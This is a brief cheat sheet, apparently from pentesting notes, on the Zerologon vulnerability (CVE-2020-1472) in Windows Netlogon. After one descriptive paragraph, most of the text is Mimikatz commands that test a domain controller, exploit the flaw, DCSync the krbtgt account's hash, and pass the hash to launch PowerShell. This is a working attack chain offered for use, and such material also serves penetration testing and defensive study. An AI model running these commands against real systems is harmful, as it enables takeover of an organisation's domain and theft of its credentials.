Zerologon, tracked as CVE-2020-1472, is an authentication bypass vulnerability in the Netlogon Remote Protocol (MS-NRPC), a remote procedure call (RPC) interface that Windows uses to authenticate users and computers on domain-based networks. It was designed for specific tasks such as maintaining relationships between members of domains and the domain controller (DC), or between multiple domain controllers across one or multiple domains and replicating the domain controller database.


#See if it is vulnerable
lsadump::zerologon /target:dc.pentesting.local /account:dc$

#Exploit it
lsadump::zerologon /target:dc.pentesting.local /account:dc$ /exploit

#dcsync
lsadump::dcsync /dc:dc.pentesting.local /authuser:dc$ /authdomain:exploit.local /authpassword:"" /authntlm /user:krbtgt 

#Pass the hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:student5 /domain: /ntlm: /run:powershell.exe"'

/target is the full fqdn of the target dc
/account variable is the name of the dc followed by $


